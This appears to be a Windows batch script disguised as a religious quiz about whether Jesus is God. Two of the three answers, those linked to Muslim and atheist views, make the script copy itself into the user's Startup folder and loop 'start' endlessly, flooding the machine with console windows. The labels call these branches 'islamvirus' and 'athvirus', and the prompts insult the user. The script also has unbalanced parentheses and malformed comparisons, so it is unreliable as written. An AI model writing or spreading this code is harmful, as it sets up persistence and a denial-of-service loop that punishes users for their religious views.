@ECHO Off
:menu
echo do think that jesus is God
color 0A
echo chooses one of these
echo
echo {A} no, but i think he my prophet
echo {B} yes, he my lord and savouir
echo {C} I HATE JESUS


set /p choice=Type your choice here and press enter 

if /i %choice%"=="a" goto optionA
if /i %choice%"=="b" goto optionB
if /i %choice%"=="c" goto optionC

echo you stupid, thst choice i wrong, somehow
timeout /t 2 >nul 
cls
goto menu

:optionA
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (

    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
	goto islamvirus
	
	
:islamvirus
start
goto optionA


:optionB
echo AMEN, CHRITOS ANIETI
pause
exit


:optionC
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
goto athvirus


:athvirus
start 
goto optionC